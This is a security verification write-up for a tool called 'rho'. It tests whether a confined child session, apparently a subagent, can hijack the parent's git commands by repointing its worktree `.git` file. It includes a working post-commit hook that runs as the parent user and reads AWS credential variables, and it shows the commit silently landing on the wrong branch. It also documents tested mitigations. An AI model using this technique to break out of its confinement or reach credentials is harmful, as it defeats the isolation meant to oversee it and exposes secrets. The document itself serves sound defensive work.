# Verification — the worktree `.git` attack, probed for real

Date: 2026-08-20. A step-9 security review rated this critical, and AGENTS.md says a severity
is a hypothesis. So it was probed. Every command and every output below is real. No rho code
was involved, because the target is git's own behaviour and the contract that must survive it.

## The hypothesis

A git worktree holds a `.git` **file**, not a directory, and that file names the
administrative directory. The file sits inside the child's own session root, so `confine`
allows the child to write it. `confine` has no concept of `.git`. So a child can point its own
`.git` at a repository it controls, and rho then runs git against that repository.

## The setup

```sh
mkdir -p /tmp/wt-probe/repo && cd /tmp/wt-probe/repo
git init -q . && git config user.email t@t && git config user.name t
echo one > a.txt && git add a.txt && git commit -qm first
git worktree add -q ../child -b probe-branch
cd ../child && cat .git
# gitdir: /private/tmp/wt-probe/repo/.git/worktrees/child
```

## The attack

The child creates a repository it owns, plants a hook, and repoints its own `.git`.

```sh
git init -q .evil
cd .evil && git config user.email t@t && git config user.name t
printf '#!/bin/sh\nid > /tmp/wt-probe/PWNED\nenv | grep -c AWS >> /tmp/wt-probe/PWNED\n' \
  > .git/hooks/post-commit
chmod +x .git/hooks/post-commit
cd .. && echo "gitdir: /tmp/wt-probe/child/.evil/.git" > .git
```

rho then runs its ordinary reclaim commands in the child root:

```sh
git add -A . && git commit -qm "rho commits the child work"
cat /tmp/wt-probe/PWNED
```

Real output:

```text
uid=501(le) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),...
4
```

```sh
git rev-parse --git-dir
# /private/tmp/wt-probe/child/.evil/.git
cd /tmp/wt-probe/repo && git log --oneline probe-branch
# 940cb49 first
```

## What the probe proves

1. **Code execution as rho.** The child's `post-commit` hook ran as the rho user.
2. **Credential reach.** `env | grep -c AWS` printed `4`, so four AWS variables were visible to
   the child's hook. This is the defect decision D-bash-scrubs-credentials already fixed for
   `bash`, reached again through git.
3. **A lying report, and lost work.** The commit landed in the child's own repository, and
   `probe-branch` still held only `first`. rho would have reported a branch that holds nothing.

The third point was not in the review. The probe found it.

## The mitigations, also probed

Hooks off:

```sh
git -c core.hooksPath=/dev/null commit -qm "with hooks off" --allow-empty
# no hook ran
```

The recorded administrative directory, passed explicitly:

```sh
ADMIN=/tmp/wt-probe/repo/.git/worktrees/child
git --git-dir="$ADMIN" --work-tree=/tmp/wt-probe/child -c core.hooksPath=/dev/null \
    -c user.email=t@t -c user.name=rho add -A .
git --git-dir="$ADMIN" --work-tree=/tmp/wt-probe/child -c core.hooksPath=/dev/null \
    -c user.email=t@t -c user.name=rho commit -qm "kept by rho"
cd /tmp/wt-probe/repo && git log --oneline probe-branch
# c70e553 kept by rho
# 940cb49 first
```

No hook ran, and the commit landed on the real branch. Both mitigations work.

## A fourth finding, from the same run

The `add -A` step printed this:

```text
warning: adding embedded git repository: .evil
```

git records a nested repository as a gitlink, so its content is **not** kept. A child that
creates any repository inside its worktree loses that content silently. The contract now
requires reclaim to find every nested `.git` and name it in the report.

## What this changed in the contract

`SPEC-subagent-worktree-isolation` section 4a now states four rules for every git call: hooks
off, an explicit recorded git directory, a scrubbed environment, and an explicit committer
identity. See decision D-a-workspace-hardens-every-git-call.
